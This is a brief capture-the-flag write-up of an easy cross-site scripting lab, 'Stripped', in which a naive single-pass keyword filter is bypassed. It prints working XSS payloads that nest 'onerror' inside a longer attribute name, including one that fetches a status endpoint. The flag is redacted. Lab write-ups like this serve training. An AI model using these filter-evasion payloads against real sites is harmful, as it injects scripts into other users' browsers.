---

Name: Stripped
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/events/stripped
Description: Rolecall's search shows "Showing N jobs for <your term>" at the top of the results. After a scare, an engineer bolted on a filter that removes known-bad strings like <script> and onerror before echoing the term. It runs once, it never re-checks its own output, and it leaves the angle brackets alone.

---

Our goal is to bypass the filters and get XSS, after some trial and error I got a working payload
```html
<img src=x oneonerrorrror=alert("hacked")>
```

Even though it generated the pop-up I did not get the flag, I checked the status and it showed as if I didn't solve the chall
```html
<img src=x oneonerrorrror="fetch('/__status.php').then(r=>r.json()).then(x=>alert(JSON.stringify(x)))">

{"solved":false,"flag":null}
```

After I sent a message on discord I found out it was because of using firefox, after trying again on chrome I got the flag
```
Staff console unlocked on this page. Internal claim reference: 
WEBVERSE{REDACTED}
```

